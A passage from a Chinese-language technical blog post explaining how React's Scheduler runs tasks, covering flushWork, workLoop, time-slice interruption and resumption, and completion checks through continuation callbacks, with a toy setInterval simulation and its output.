  };</pre><p><code>performWorkUntilDeadline</code>内部调用的是<code>scheduledHostCallback</code>，它早在开始调度的时候就被<code>requestHostCallback</code>赋值为了<code>flushWork</code>，具体可以翻到上面回顾一下<code>requestHostCallback</code>的实现。</p><p><code>flushWork</code>作为真正去执行任务的函数，它会循环taskQueue，逐一调用里面的任务函数。我们看一下<code>flushWork</code>具体做了什么。</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="function flushWork(hasTimeRemaining, initialTime) {

  ...

  return workLoop(hasTimeRemaining, initialTime);

  ...

}" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">flushWork</span>(<span class="hljs-params">hasTimeRemaining, initialTime</span>) {

  ...

  <span class="hljs-keyword">return</span> <span class="hljs-title function_">workLoop</span>(hasTimeRemaining, initialTime);

  ...

}</pre><p>它调用了<code>workLoop</code>，并将其调用的结果return了出去。那么现在任务执行的核心内容看来就在<code>workLoop</code>中了。<code>workLoop</code>的调用使得任务最终被执行。</p><h4>任务中断和恢复</h4><p>要理解<code>workLoop</code>，需要回顾Scheduler的功能之一：通过时间片限制任务的执行时间。那么既然任务的执行被限制了，它肯定有可能是尚未完成的，如果未完成被中断，那么需要将它恢复。</p><p>所以时间片下的任务执行具备下面的重要特点：<strong>会被中断，也会被恢复。</strong></p><p>不难推测出，<code>workLoop</code>作为实际执行任务的函数，它做的事情肯定与任务的中断恢复有关。我们先看一下它的结构：</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="function workLoop(hasTimeRemaining, initialTime) {

  // 获取taskQueue中排在最前面的任务
  currentTask = peek(taskQueue);
  while (currentTask !== null) {

    if (currentTask.expirationTime &gt; currentTime &amp;&amp;
     (!hasTimeRemaining || shouldYieldToHost())) {
       // break掉while循环
       break
    }

    ...
    // 执行任务
    ...

    // 任务执行完毕，从队列中删除
    pop(taskQueue);

    // 获取下一个任务，继续循环
    currentTask = peek(taskQueue);
  }


  if (currentTask !== null) {
    // 如果currentTask不为空，说明是时间片的限制导致了任务中断
    // return 一个 true告诉外部，此时任务还未执行完，还有任务，
    // 翻译成英文就是hasMoreWork
    return true;
  } else {
    // 如果currentTask为空，说明taskQueue队列中的任务已经都
    // 执行完了，然后从timerQueue中找任务，调用requestHostTimeout
    // 去把task放到taskQueue中，到时会再次发起调度，但是这次，
    // 会先return false，告诉外部当前的taskQueue已经清空，
    // 先停止执行任务，也就是终止任务调度

    const firstTimer = peek(timerQueue);
    if (firstTimer !== null) {
      requestHostTimeout(handleTimeout, firstTimer.startTime - currentTime);
    }

    return false;
  }
}" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoop</span>(<span class="hljs-params">hasTimeRemaining, initialTime</span>) {

  <span class="hljs-comment">// 获取taskQueue中排在最前面的任务</span>
  currentTask = <span class="hljs-title function_">peek</span>(taskQueue);
  <span class="hljs-keyword">while</span> (currentTask !== <span class="hljs-literal">null</span>) {

    <span class="hljs-keyword">if</span> (currentTask.<span class="hljs-property">expirationTime</span> &gt; currentTime &amp;&amp;
     (!hasTimeRemaining || <span class="hljs-title function_">shouldYieldToHost</span>())) {
       <span class="hljs-comment">// break掉while循环</span>
       <span class="hljs-keyword">break</span>
    }

    ...
    <span class="hljs-comment">// 执行任务</span>
    ...

    <span class="hljs-comment">// 任务执行完毕，从队列中删除</span>
    <span class="hljs-title function_">pop</span>(taskQueue);

    <span class="hljs-comment">// 获取下一个任务，继续循环</span>
    currentTask = <span class="hljs-title function_">peek</span>(taskQueue);
  }


  <span class="hljs-keyword">if</span> (currentTask !== <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// 如果currentTask不为空，说明是时间片的限制导致了任务中断</span>
    <span class="hljs-comment">// return 一个 true告诉外部，此时任务还未执行完，还有任务，</span>
    <span class="hljs-comment">// 翻译成英文就是hasMoreWork</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 如果currentTask为空，说明taskQueue队列中的任务已经都</span>
    <span class="hljs-comment">// 执行完了，然后从timerQueue中找任务，调用requestHostTimeout</span>
    <span class="hljs-comment">// 去把task放到taskQueue中，到时会再次发起调度，但是这次，</span>
    <span class="hljs-comment">// 会先return false，告诉外部当前的taskQueue已经清空，</span>
    <span class="hljs-comment">// 先停止执行任务，也就是终止任务调度</span>

    <span class="hljs-keyword">const</span> firstTimer = <span class="hljs-title function_">peek</span>(timerQueue);
    <span class="hljs-keyword">if</span> (firstTimer !== <span class="hljs-literal">null</span>) {
      <span class="hljs-title function_">requestHostTimeout</span>(handleTimeout, firstTimer.<span class="hljs-property">startTime</span> - currentTime);
    }

    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }
}</pre><p>workLoop中可以分为两大部分：循环taskQueue执行任务 和 任务状态的判断。</p><p><strong>循环taskQueue执行任务</strong></p><p>暂且不管任务如何执行，只关注任务如何被时间片限制，workLoop中：</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="if (currentTask.expirationTime &gt; currentTime &amp;&amp;
     (!hasTimeRemaining || shouldYieldToHost())) {
   // break掉while循环
   break
}" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-keyword">if</span> (currentTask.<span class="hljs-property">expirationTime</span> &gt; currentTime &amp;&amp;
     (!hasTimeRemaining || <span class="hljs-title function_">shouldYieldToHost</span>())) {
   <span class="hljs-comment">// break掉while循环</span>
   <span class="hljs-keyword">break</span>
}</pre><p>currentTask就是当前正在执行的任务，它中止的判断条件是：任务并未过期，但已经没有剩余时间了（由于hasTimeRemaining一直为true，这与MessageChannel作为宏任务的执行时机有关，我们忽略这个判断条件，只看时间片），或者应该让出执行权给主线程（时间片的限制），也就是说currentTask执行得好好的，可是时间不允许，那只能先break掉本次while循环，使得本次循环下面currentTask执行的逻辑都不能被执行到（<strong>此处是中断任务的关键</strong>）。但是被break的只是while循环，while下部还是会判断currentTask的状态。</p><p>由于它只是被中止了，所以currentTask不可能是null，那么会return一个true告诉外部还没完事呢（<strong>此处是恢复任务的关键</strong>），否则说明全部的任务都已经执行完了，taskQueue已经被清空了，return一个false好让外部<strong>终止本次调度</strong>。而workLoop的执行结果会被flushWork return出去，flushWork实际上是<code>scheduledHostCallback</code>，当<code>performWorkUntilDeadline</code>检测到<code>scheduledHostCallback</code>的返回值（hasMoreWork）为false时，就会停止调度。</p><p>回顾<code>performWorkUntilDeadline</code>中的行为，可以很清晰地将任务中断恢复的机制串联起来：</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="  const performWorkUntilDeadline = () =&gt; {

    ...

    const hasTimeRemaining = true;
    // scheduledHostCallback去执行任务的函数，
    // 当任务因为时间片被打断时，它会返回true，表示
    // 还有任务，所以会再让调度者调度一个执行者
    // 继续执行任务
    const hasMoreWork = scheduledHostCallback(
      hasTimeRemaining,
      currentTime,
    );

    if (!hasMoreWork) {
      // 如果没有任务了，停止调度
      isMessageLoopRunning = false;
      scheduledHostCallback = null;
    } else {
      // 如果还有任务，继续让调度者调度执行者，便于继续
      // 完成任务
      port.postMessage(null);
    }
  };" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript">  <span class="hljs-keyword">const</span> <span class="hljs-title function_">performWorkUntilDeadline</span> = (<span class="hljs-params"></span>) =&gt; {

    ...

    <span class="hljs-keyword">const</span> hasTimeRemaining = <span class="hljs-literal">true</span>;
    <span class="hljs-comment">// scheduledHostCallback去执行任务的函数，</span>
    <span class="hljs-comment">// 当任务因为时间片被打断时，它会返回true，表示</span>
    <span class="hljs-comment">// 还有任务，所以会再让调度者调度一个执行者</span>
    <span class="hljs-comment">// 继续执行任务</span>
    <span class="hljs-keyword">const</span> hasMoreWork = <span class="hljs-title function_">scheduledHostCallback</span>(
      hasTimeRemaining,
      currentTime,
    );

    <span class="hljs-keyword">if</span> (!hasMoreWork) {
      <span class="hljs-comment">// 如果没有任务了，停止调度</span>
      isMessageLoopRunning = <span class="hljs-literal">false</span>;
      scheduledHostCallback = <span class="hljs-literal">null</span>;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// 如果还有任务，继续让调度者调度执行者，便于继续</span>
      <span class="hljs-comment">// 完成任务</span>
      port.<span class="hljs-title function_">postMessage</span>(<span class="hljs-literal">null</span>);
    }
  };</pre><p>当任务被打断之后，<code>performWorkUntilDeadline</code>会再让调度者调用一个执行者，继续执行这个任务，直到任务完成。但是这里有一个重点是如何判断该任务是否完成呢？这就需要研究<code>workLoop</code>中执行任务的那部分逻辑。</p><h4>判断单个任务的完成状态</h4><p>任务的中断恢复是一个重复的过程，该过程会一直重复到任务完成。所以判断任务是否完成非常重要，而任务未完成则会<strong>重复执行任务函数</strong>。</p><p>我们可以用递归函数做类比，如果没到递归边界，就重复调用自己。这个递归边界，就是任务完成的标志。因为递归函数所处理的任务就是它本身，可以很方便地把任务完成作为递归边界去结束任务，但是Scheduler中的<code>workLoop</code>与递归不同的是，它只是一个执行任务的，这个任务并不是它自己产生的，而是外部的（比如它去执行React的工作循环渲染fiber树），它可以做到重复执行任务函数，但边界（即任务是否完成）却无法像递归那样直接获取，只能依赖任务函数的返回值去判断。即：<strong>若任务函数返回值为函数，那么就说明当前任务尚未完成，需要继续调用任务函数，否则任务完成</strong>。<code>workLoop</code>就是通过这样的办法<strong>判断单个任务的完成状态</strong>。</p><p>在真正讲解<code>workLoop</code>中的执行任务的逻辑之前，我们用一个例子来理解一下判断任务完成状态的核心。</p><p>有一个任务calculate，负责把currentResult每次加1，一直到3为止。当没到3的时候，calculate不是去调用它自身，而是将自身return出去，一旦到了3，return的是null。这样外部才可以知道calculate是否已经完成了任务。</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="const result = 3
let currentResult = 0
function calculate() {
    currentResult++
    if (currentResult &lt; result) {
        return calculate
    }
    return null
}" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-keyword">const</span> result = <span class="hljs-number">3</span>
<span class="hljs-keyword">let</span> currentResult = <span class="hljs-number">0</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">calculate</span>(<span class="hljs-params"></span>) {
    currentResult++
    <span class="hljs-keyword">if</span> (currentResult &lt; result) {
        <span class="hljs-keyword">return</span> calculate
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
}</pre><p>上面是任务，接下来我们模拟一下调度，去执行calculate。但执行应该是基于时间片的，为了观察效果，只用setInterval去模拟因为时间片中止恢复任务的机制（相当粗糙的模拟，只需明白这是时间片的模拟即可，重点关注任务完成状态的判断），1秒执行它一次，即一次只完成全部任务的三分之一。</p><p>另外Scheduler中有两个队列去管理任务，我们暂且只用一个队列（taskQueue）存储任务。除此之外还需要三个角色：把任务加入调度的函数（调度入口scheduleCallback）、开始调度的函数（requestHostCallback）、执行任务的函数（workLoop，关键逻辑所在）。</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="const result = 3
let currentResult = 0

function calculate() {
    currentResult++
    if (currentResult &lt; result) {
        return calculate
    }
    return null
}

// 存放任务的队列
const taskQueue = []
// 存放模拟时间片的定时器
let interval

// 调度入口----------------------------------------
const scheduleCallback = (task, priority) =&gt; {
    // 创建一个专属于调度器的任务
    const taskItem = {
        callback: task,
        priority
    }

    // 向队列中添加任务
    taskQueue.push(taskItem)
    // 优先级影响到任务在队列中的排序，将优先级最高的任务排在最前面
    taskQueue.sort((a, b) =&gt; (a.priority - b.priority))
    // 开始执行任务，调度开始
    requestHostCallback(workLoop)
}
// 开始调度-----------------------------------------
const requestHostCallback = cb =&gt; {
    interval = setInterval(cb, 1000)
}
// 执行任务-----------------------------------------
const workLoop = () =&gt; {
    // 从队列中取出任务
    const currentTask = taskQueue[0]
    // 获取真正的任务函数，即calculate
    const taskCallback = currentTask.callback
    // 判断任务函数否是函数，若是，执行它，将返回值更新到currentTask的callback中
    // 所以，taskCallback是上一阶段执行的返回值，若它是函数类型，则说明上一次执行返回了函数
    // 类型，说明任务尚未完成，本次继续执行这个函数，否则说明任务完成。
    if (typeof taskCallback === &#39;function&#39;) {
        currentTask.callback = taskCallback()
        console.log(&#39;正在执行任务，当前的currentResult 是&#39;, currentResult);
    } else {
        // 任务完成。将当前的这个任务从taskQueue中移除，并清除定时器
        console.log(&#39;任务完成，最终的 currentResult 是&#39;, currentResult);
        taskQueue.shift()
        clearInterval(interval)
    }
}

// 把calculate加入调度，也就意味着调度开始
scheduleCallback(calculate, 1)" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-keyword">const</span> result = <span class="hljs-number">3</span>
<span class="hljs-keyword">let</span> currentResult = <span class="hljs-number">0</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">calculate</span>(<span class="hljs-params"></span>) {
    currentResult++
    <span class="hljs-keyword">if</span> (currentResult &lt; result) {
        <span class="hljs-keyword">return</span> calculate
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
}

<span class="hljs-comment">// 存放任务的队列</span>
<span class="hljs-keyword">const</span> taskQueue = []
<span class="hljs-comment">// 存放模拟时间片的定时器</span>
<span class="hljs-keyword">let</span> interval

<span class="hljs-comment">// 调度入口----------------------------------------</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">scheduleCallback</span> = (<span class="hljs-params">task, priority</span>) =&gt; {
    <span class="hljs-comment">// 创建一个专属于调度器的任务</span>
    <span class="hljs-keyword">const</span> taskItem = {
        <span class="hljs-attr">callback</span>: task,
        priority
    }

    <span class="hljs-comment">// 向队列中添加任务</span>
    taskQueue.<span class="hljs-title function_">push</span>(taskItem)
    <span class="hljs-comment">// 优先级影响到任务在队列中的排序，将优先级最高的任务排在最前面</span>
    taskQueue.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> (a.<span class="hljs-property">priority</span> - b.<span class="hljs-property">priority</span>))
    <span class="hljs-comment">// 开始执行任务，调度开始</span>
    <span class="hljs-title function_">requestHostCallback</span>(workLoop)
}
<span class="hljs-comment">// 开始调度-----------------------------------------</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">requestHostCallback</span> = cb =&gt; {
    interval = <span class="hljs-built_in">setInterval</span>(cb, <span class="hljs-number">1000</span>)
}
<span class="hljs-comment">// 执行任务-----------------------------------------</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">workLoop</span> = (<span class="hljs-params"></span>) =&gt; {
    <span class="hljs-comment">// 从队列中取出任务</span>
    <span class="hljs-keyword">const</span> currentTask = taskQueue[<span class="hljs-number">0</span>]
    <span class="hljs-comment">// 获取真正的任务函数，即calculate</span>
    <span class="hljs-keyword">const</span> taskCallback = currentTask.<span class="hljs-property">callback</span>
    <span class="hljs-comment">// 判断任务函数否是函数，若是，执行它，将返回值更新到currentTask的callback中</span>
    <span class="hljs-comment">// 所以，taskCallback是上一阶段执行的返回值，若它是函数类型，则说明上一次执行返回了函数</span>
    <span class="hljs-comment">// 类型，说明任务尚未完成，本次继续执行这个函数，否则说明任务完成。</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> taskCallback === <span class="hljs-string">'function'</span>) {
        currentTask.<span class="hljs-property">callback</span> = <span class="hljs-title function_">taskCallback</span>()
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'正在执行任务，当前的currentResult 是'</span>, currentResult);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 任务完成。将当前的这个任务从taskQueue中移除，并清除定时器</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'任务完成，最终的 currentResult 是'</span>, currentResult);
        taskQueue.<span class="hljs-title function_">shift</span>()
        <span class="hljs-built_in">clearInterval</span>(interval)
    }
}

<span class="hljs-comment">// 把calculate加入调度，也就意味着调度开始</span>
<span class="hljs-title function_">scheduleCallback</span>(calculate, <span class="hljs-number">1</span>)</pre><p>最终的执行结果如下：</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="正在执行任务，当前的currentResult 是 1
正在执行任务，当前的currentResult 是 2
正在执行任务，当前的currentResult 是 3
任务完成，最终的 currentResult 是 3" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="hljs language-undefined">正在执行任务，当前的currentResult 是 1
正在执行任务，当前的currentResult 是 2
正在执行任务，当前的currentResult 是 3
任务完成，最终的 currentResult 是 3</pre><p>可见，如果没有加到3，那么calculate会return它自己，<strong>workLoop若判断返回值为function，说明任务还未完成，它就会继续调用任务函数去完成任务</strong>。</p><p>这个例子只保留了workLoop中判断任务完成状态的逻辑，其余的地方并不完善，要以真正的的workLoop为准，现在让我们贴出它的全部代码，完整地看一下真正的实现：</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="function workLoop(hasTimeRemaining, initialTime) {
  let currentTime = initialTime;
  // 开始执行前检查一下timerQueue中的过期任务，
  // 放到taskQueue中
  advanceTimers(currentTime);
  // 获取taskQueue中最紧急的任务
  currentTask = peek(taskQueue);

  // 循环taskQueue，执行任务
  while (
    currentTask !== null &amp;&amp;
    !(enableSchedulerDebugging &amp;&amp; isSchedulerPaused)
  ) {
    if (
      currentTask.expirationTime &gt; currentTime &amp;&amp;
      (!hasTimeRemaining || shouldYieldToHost())
    ) {
      // 时间片的限制，中断任务
      break;
    }
    // 执行任务 ---------------------------------------------------
    // 获取任务的执行函数，这个callback就是React传给Scheduler
    // 的任务。例如：performConcurrentWorkOnRoot
    const callback = currentTask.callback;
    if (typeof callback === &#39;function&#39;) {
      // 如果执行函数为function，说明还有任务可做，调用它
      currentTask.callback = null;
      // 获取任务的优先级
      currentPriorityLevel = currentTask.priorityLevel;
      // 任务是否过期
      const didUserCallbackTimeout = currentTask.expirationTime &lt;= currentTime;
      // 获取任务函数的执行结果
      const continuationCallback = callback(didUserCallbackTimeout);
      if (typeof continuationCallback === &#39;function&#39;) {
        // 检查callback的执行结果返回的是不是函数，如果返回的是函数，则将这个函数作为当前任务新的回调。
        // concurrent模式下，callback是performConcurrentWorkOnRoot，其内部根据当前调度的任务
        // 是否相同，来决定是否返回自身，如果相同，则说明还有任务没做完，返回自身，其作为新的callback
        // 被放到当前的task上。while循环完成一次之后，检查shouldYieldToHost，如果需要让出执行权，
        // 则中断循环，走到下方，判断currentTask不为null，返回true，说明还有任务，回到performWorkUntilDeadline
        // 中，判断还有任务，继续port.postMessage(null)，调用监听函数performWorkUntilDeadline（执行者），
        // 继续调用workLoop行任务

        // 将返回值继续赋值给currentTask.callback，为得是下一次能够继续执行callback，
        // 获取它的返回值，继续判断任务是否完成。
        currentTask.callback = continuationCallback;
      } else {
        if (currentTask === peek(taskQueue)) {
          pop(taskQueue);
        }
      }
      advanceTimers(currentTime);
    } else {
      pop(taskQueue);
    }
    // 从taskQueue中继续获取任务，如果上一个任务未完成，那么它将不会
    // 被从队列剔除，所以获取到的currentTask还是上一个任务，会继续
    // 去执行它
    currentTask = peek(taskQueue);
  }
  // return 的结果会作为 performWorkUntilDeadline
  // 中判断是否还需要再次发起调度的依据
  if (currentTask !== null) {
    return true;
  } else {
    // 若任务完成，去timerQueue中找需要最早开始执行的那个任务
    // 调度requestHostTimeout，目的是等到了它的开始事件时把它
    // 放到taskQueue中，再次调度
    const firstTimer = peek(timerQueue);
    if (firstTimer !== null) {
      requestHostTimeout(handleTimeout, firstTimer.startTime - currentTime);
    }
    return false;
  }
}" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoop</span>(<span class="hljs-params">hasTimeRemaining, initialTime</span>) {
  <span class="hljs-keyword">let</span> currentTime = initialTime;
  <span class="hljs-comment">// 开始执行前检查一下timerQueue中的过期任务，</span>
  <span class="hljs-comment">// 放到taskQueue中</span>
  <span class="hljs-title function_">advanceTimers</span>(currentTime);
  <span class="hljs-comment">// 获取taskQueue中最紧急的任务</span>
  currentTask = <span class="hljs-title function_">peek</span>(taskQueue);

  <span class="hljs-comment">// 循环taskQueue，执行任务</span>
  <span class="hljs-keyword">while</span> (
    currentTask !== <span class="hljs-literal">null</span> &amp;&amp;
    !(enableSchedulerDebugging &amp;&amp; isSchedulerPaused)
  ) {
    <span class="hljs-keyword">if</span> (
      currentTask.<span class="hljs-property">expirationTime</span> &gt; currentTime &amp;&amp;
      (!hasTimeRemaining || <span class="hljs-title function_">shouldYieldToHost</span>())
    ) {
      <span class="hljs-comment">// 时间片的限制，中断任务</span>
      <span class="hljs-keyword">break</span>;
    }
    <span class="hljs-comment">// 执行任务 ---------------------------------------------------</span>
    <span class="hljs-comment">// 获取任务的执行函数，这个callback就是React传给Scheduler</span>
    <span class="hljs-comment">// 的任务。例如：performConcurrentWorkOnRoot</span>
    <span class="hljs-keyword">const</span> callback = currentTask.<span class="hljs-property">callback</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> callback === <span class="hljs-string">'function'</span>) {
      <span class="hljs-comment">// 如果执行函数为function，说明还有任务可做，调用它</span>
      currentTask.<span class="hljs-property">callback</span> = <span class="hljs-literal">null</span>;
      <span class="hljs-comment">// 获取任务的优先级</span>
      currentPriorityLevel = currentTask.<span class="hljs-property">priorityLevel</span>;
      <span class="hljs-comment">// 任务是否过期</span>
      <span class="hljs-keyword">const</span> didUserCallbackTimeout = currentTask.<span class="hljs-property">expirationTime</span> &lt;= currentTime;
      <span class="hljs-comment">// 获取任务函数的执行结果</span>
      <span class="hljs-keyword">const</span> continuationCallback = <span class="hljs-title function_">callback</span>(didUserCallbackTimeout);
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> continuationCallback === <span class="hljs-string">'function'</span>) {
        <span class="hljs-comment">// 检查callback的执行结果返回的是不是函数，如果返回的是函数，则将这个函数作为当前任务新的回调。</span>
        <span class="hljs-comment">// concurrent模式下，callback是performConcurrentWorkOnRoot，其内部根据当前调度的任务</span>
        <span class="hljs-comment">// 是否相同，来决定是否返回自身，如果相同，则说明还有任务没做完，返回自身，其作为新的callback</span>
        <span class="hljs-comment">// 被放到当前的task上。while循环完成一次之后，检查shouldYieldToHost，如果需要让出执行权，</span>
        <span class="hljs-comment">// 则中断循环，走到下方，判断currentTask不为null，返回true，说明还有任务，回到performWorkUntilDeadline</span>
        <span class="hljs-comment">// 中，判断还有任务，继续port.postMessage(null)，调用监听函数performWorkUntilDeadline（执行者），</span>
        <span class="hljs-comment">// 继续调用workLoop行任务</span>

        <span class="hljs-comment">// 将返回值继续赋值给currentTask.callback，为得是下一次能够继续执行callback，</span>
        <span class="hljs-comment">// 获取它的返回值，继续判断任务是否完成。</span>
        currentTask.<span class="hljs-property">callback</span> = continuationCallback;
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">if</span> (currentTask === <span class="hljs-title function_">peek</span>(taskQueue)) {
          <span class="hljs-title function_">pop</span>(taskQueue);
        }
      }
      <span class="hljs-title function_">advanceTimers</span>(currentTime);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title function_">pop</span>(taskQueue);
    }
    <span class="hljs-comment">// 从taskQueue中继续获取任务，如果上一个任务未完成，那么它将不会</span>
    <span class="hljs-comment">// 被从队列剔除，所以获取到的currentTask还是上一个任务，会继续</span>
    <span class="hljs-comment">// 去执行它</span>
    currentTask = <span class="hljs-title function_">peek</span>(taskQueue);
  }
  <span class="hljs-comment">// return 的结果会作为 performWorkUntilDeadline</span>
  <span class="hljs-comment">// 中判断是否还需要再次发起调度的依据</span>
  <span class="hljs-keyword">if</span> (currentTask !== <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 若任务完成，去timerQueue中找需要最早开始执行的那个任务</span>
    <span class="hljs-comment">// 调度requestHostTimeout，目的是等到了它的开始事件时把它</span>
    <span class="hljs-comment">// 放到taskQueue中，再次调度</span>
    <span class="hljs-keyword">const</span> firstTimer = <span class="hljs-title function_">peek</span>(timerQueue);
    <span class="hljs-keyword">if</span> (firstTimer !== <span class="hljs-literal">null</span>) {
      <span class="hljs-title function_">requestHostTimeout</span>(handleTimeout, firstTimer.<span class="hljs-property">startTime</span> - currentTime);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }
}</pre><p>所以，<strong>workLoop是通过判断任务函数的返回值去识别任务的完成状态的</strong>。</p><p>总结一下判断任务完成状态与任务执行的整体关系：当开始调度后，调度者调度执行者去执行任务，实际上是执行任务上的callback（也就是任务函数）。如果执行者判断callback返回值为一个function，说明未完成，那么会将返回的这个function再次赋值给任务的callback，由于任务还未完成，所以并不会被剔除出taskQueue，currentTask获取到的还是它，while循环到下一次还是会继续执行这个任务，直到任务完成出队，才会继续下一个。</p><p>另外有一个点需要提一下，就是构建fiber树的任务函数：<code>performConcurrentWorkOnRoot</code>，它接受的参数是fiberRoot。</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="function performConcurrentWorkOnRoot(root) {
  ...
}" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">performConcurrentWorkOnRoot</span>(<span class="hljs-params">root</span>) {
  ...
}</pre><p>在workLoop中它会被这样调用（callback即为<code>performConcurrentWorkOnRoot</code>）：</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="const didUserCallbackTimeout = currentTask.expirationTime &lt;= currentTime;
const continuationCallback = callback(didUserCallbackTimeout);" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-keyword">const</span> didUserCallbackTimeout = currentTask.<span class="hljs-property">expirationTime</span> &lt;= currentTime;
<span class="hljs-keyword">const</span> continuationCallback = <span class="hljs-title function_">callback</span>(didUserCallbackTimeout);</pre><p><code>didUserCallbackTimeout</code>明显是boolean类型的值，并不是fiberRoot，但performConcurrentWorkOnRoot却能正常调用。这是因为在开始调度，以及后续的return自身的时候，都在bind的时候将root传进去了。</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="// 调度的时候
scheduleCallback(
  schedulerPriorityLevel,
  performConcurrentWorkOnRoot.bind(null, root),
);

// 其内部return自身的时候
function performConcurrentWorkOnRoot(root) {
  ...

  if (root.callbackNode === originalCallbackNode) {
    return performConcurrentWorkOnRoot.bind(null, root);
  }
  return null;
}" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-comment">// 调度的时候</span>
<span class="hljs-title function_">scheduleCallback</span>(
  schedulerPriorityLevel,
  performConcurrentWorkOnRoot.<span class="hljs-title function_">bind</span>(<span class="hljs-literal">null</span>, root),
);

<span class="hljs-comment">// 其内部return自身的时候</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">performConcurrentWorkOnRoot</span>(<span class="hljs-params">root</span>) {
  ...

  <span class="hljs-keyword">if</span> (root.<span class="hljs-property">callbackNode</span> === originalCallbackNode) {
    <span class="hljs-keyword">return</span> performConcurrentWorkOnRoot.<span class="hljs-title function_">bind</span>(<span class="hljs-literal">null</span>, root);
  }
  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}</pre><p>这样的话，再给它传参数调用它，那这个参数只能作为后续的参数被接收到，<code>performConcurrentWorkOnRoot</code>中接收到的第一个参数还是bind时传入的那个root，这个特点与bind的实现有关。可以跑一下下面的这个简单例子：</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
